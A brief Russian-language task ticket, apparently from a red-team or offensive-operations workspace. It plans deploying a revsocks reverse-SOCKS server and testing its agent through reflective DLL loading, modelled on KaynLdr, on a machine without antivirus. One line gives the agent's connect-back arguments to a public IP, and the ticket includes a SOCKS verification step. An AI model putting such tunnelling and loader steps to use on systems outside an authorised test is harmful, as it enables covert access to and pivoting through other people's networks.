# 003: server deploy на recon + тест agent на NoAV (DLL DllSpawn)

## Что сделать
Задеплоить revsocks **server** на recon (185.224.132.148) в tmux `work` session через deploy repo (новый `lib/revsocks.sh`). Протестировать **agent** на NoAV (10.0.0.2) через DLL DllSpawn (reflective-loader хост, имитация KaynLdr) → SOCKS5 verify через `curl -x socks5`.

## Границы
- Только RECON (OPS не трогать).
- Agent тест — DLL DllSpawn (не EXE), reflective-load хост на NoAV (нет активного HavoX-бота).
- Server: :443 agents / :1080 socks (localhost) / :8081 admin (localhost).

## Статус
IN PROGRESS

## Состояние
**план:**
- deploy repo: `lib/revsocks.sh` + shared.env + recon/config.env + recon/deploy.sh case + deploy_core фазы + common.sh stop/ufw.
- `./deploy.sh revsocks` → work:2 revsocks (link), session revsocks:server.
- Reflective-loader хост (C, mingw) → vm_deploy NoAV → exec с base64 args `-connect 185.224.132.148:443 -pass <PASS> -tls -ws`.
- Verify: `agents` на server, `curl -x socks5://127.0.0.1:1080 http://10.0.0.2`, нагрузка 0 yamux drop.

**сделано:** —
**осталось:** всё.
